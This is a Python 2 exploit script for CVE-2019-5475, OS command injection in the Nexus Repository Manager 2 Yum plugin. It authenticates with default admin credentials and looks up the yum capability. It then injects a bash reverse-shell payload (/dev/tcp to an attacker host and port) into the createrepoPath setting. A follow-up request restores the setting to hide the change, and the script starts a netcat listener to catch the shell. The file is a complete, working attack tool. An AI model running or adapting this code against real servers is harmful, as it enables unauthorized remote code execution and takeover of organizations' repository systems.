#!/usr/bin/env python2
#  -*- coding: utf-8 -*- #######################################################################################
# ███▄▄▄▄      ▄████████ ▀████    ▐████▀ ███    █▄     ▄████████    ▄████████  ▄████████    ▄████████          #
# ███▀▀▀██▄   ███    ███   ███▌   ████▀  ███    ███   ███    ███   ███    ███ ███    ███   ███    ███          #
# ███   ███   ███    █▀     ███  ▐███    ███    ███   ███    █▀    ███    ███ ███    █▀    ███    █▀           #
# ███   ███  ▄███▄▄▄        ▀███▄███▀    ███    ███   ███         ▄███▄▄▄▄██▀ ███         ▄███▄▄▄              #
# ███   ███ ▀▀███▀▀▀        ████▀██▄     ███    ███ ▀███████████ ▀▀███▀▀▀▀▀   ███        ▀▀███▀▀▀              #
# ███   ███   ███    █▄    ▐███  ▀███    ███    ███          ███ ▀███████████ ███    █▄    ███    █▄           #
# ███   ███   ███    ███  ▄███     ███▄  ███    ███    ▄█    ███   ███    ███ ███    ███   ███    ███          #
#  ▀█   █▀    ██████████ ████       ███▄ ████████▀   ▄████████▀    ███    ███ ████████▀    ██████████          #
# DATE                                                                                                         #
# 14/12/2019                                                                                                   #
#                                                                                                              #
# DESCRIPTION                                                                                                  #
#                                                                                                              #
# CVE-2019-5475 - Nexus Repository Manager 2 - OS Command Injection                                            #
# The Nexus Yum Repository Plugin in v2 is vulnerable to Remote Code Execution when instances                  #
# using CommandLineExecutor.java are supplied vulnerable data, such as the Yum Configuration Capability.       #
#                                                                                                              #
# This code exploit this issue and provide you with a reverse shell                                            #
#                                                                                                              #
# nighter@nighter.se                                                                                 #
#                                                                                                              #
################################################################################################################

import requests
import signal
import os
import sys
import time
from bs4 import BeautifulSoup

from multiprocessing import Process

# Handler to exist cleanly on ctrl+C
def signal_handler(signal, frame):
    print "\nYou pressed Ctrl+C!"
    sys.exit()
signal.signal(signal.SIGINT, signal_handler)


def get_id():

    try:
        session = requests.Session()
        session.auth = (USERNAME, PASSWORD)
        r = session.get('%s/nexus/service/siesta/capabilities/' % URL)
        _xml = BeautifulSoup(r.text, features="lxml")
        for cap in _xml.findAll('capability'):
            if '<typeid>yum</typeid>' == str(cap.typeid).strip():
                _id = str(cap.id).replace('<id>', '').replace('</id>', '').strip()
                print("[+] Got ID: %s" % _id)
                return _id
    except:
        print('[-] Connection failed')
        sys.exit(1)


def exploit():

    time.sleep(5)
    session = requests.Session()
    session.auth = (USERNAME, PASSWORD)
    _id = get_id()

    headers = {'Accept': 'application/json,application/vnd.siesta-error-v1+json,application/vnd.siesta-validation-errors-v1+json',
               'Content-Type': 'application/json',
               'X-Nexus-UI': 'true',
               'X-Requested-With': 'XMLHttpRequest'}

    data = '{"typeId":"yum","enabled":true,' \
           '"properties":[{"key":"maxNumberParallelThreads","value":"10"},' \
           '{"key":"createrepoPath",' \
           '"value":"bash -c $@|bash 0 echo bash -i >&/dev/tcp/%s/%s 0>&1 ||"},' \
           '{"key":"mergerepoPath","value":"mergerepo"}],' \
           '"id":"%s","notes":"Automatically added on Fri Dec 13 18:01:05 UTC 2019"}' % (LHOST, LPORT, _id)

    print('[+] Exploit')
    r = session.put('%s/nexus/service/siesta/capabilities/%s' % (URL, _id), data=data, headers=headers)


def cleanup():

    time.sleep(8)
    session = requests.Session()
    session.auth = (USERNAME, PASSWORD)
    _id = get_id()

    headers = {'Accept': 'application/json,application/vnd.siesta-error-v1+json,application/vnd.siesta-validation-errors-v1+json',
               'Content-Type': 'application/json',
               'X-Nexus-UI': 'true',
               'X-Requested-With': 'XMLHttpRequest'}

    data = '{"typeId":"yum","enabled":true,' \
           '"properties":[{"key":"maxNumberParallelThreads","value":"10"},' \
           '{"key":"createrepoPath",' \
           '"value":"createrepo"},' \
           '{"key":"mergerepoPath","value":"mergerepo"}],' \
           '"id":"%s","notes":"Automatically added on Fri Dec 13 18:01:05 UTC 2019"}' % _id

    r = session.put('%s/nexus/service/siesta/capabilities/%s' % (URL, _id), data=data, headers=headers)


if __name__ == '__main__':

    if len(sys.argv) <= 3:
        print("""
███▄▄▄▄      ▄████████ ▀████    ▐████▀ ███    █▄     ▄████████    ▄████████  ▄████████    ▄████████
███▀▀▀██▄   ███    ███   ███▌   ████▀  ███    ███   ███    ███   ███    ███ ███    ███   ███    ███
███   ███   ███    █▀     ███  ▐███    ███    ███   ███    █▀    ███    ███ ███    █▀    ███    █▀
███   ███  ▄███▄▄▄        ▀███▄███▀    ███    ███   ███         ▄███▄▄▄▄██▀ ███         ▄███▄▄▄
███   ███ ▀▀███▀▀▀        ████▀██▄     ███    ███ ▀███████████ ▀▀███▀▀▀▀▀   ███        ▀▀███▀▀▀
███   ███   ███    █▄    ▐███  ▀███    ███    ███          ███ ▀███████████ ███    █▄    ███    █▄
███   ███   ███    ███  ▄███     ███▄  ███    ███    ▄█    ███   ███    ███ ███    ███   ███    ███
 ▀█   █▀    ██████████ ████       ███▄ ████████▀   ▄████████▀    ███    ███ ████████▀    ██████████
[nighter@nighter.se]
    """)
        print("Usage: %s <URL> <LHOST> <LPORT> [USERNAME] [PASSWORD]" % (sys.argv[0]))
        print("EXAMPLE: ./nexus_rce.py 'http://127.0.0.1:8081' 10.10.14.24 4444")
        sys.exit(0)

    URL = sys.argv[1]
    LHOST = sys.argv[2]
    LPORT = sys.argv[3]

    try:
        USERNAME = sys.argv[4]
    except:
        USERNAME = 'admin'

    try:
        PASSWORD = sys.argv[5]
    except:
        PASSWORD = 'admin123'

    print("[+] LHOST = %s" % LHOST)

    p = Process(target=exploit)
    p.start()

    p = Process(target=cleanup)
    p.start()

    print("[+] Netcat = %s" % LPORT)
    os.system('nc -lnvp %s' % LPORT)
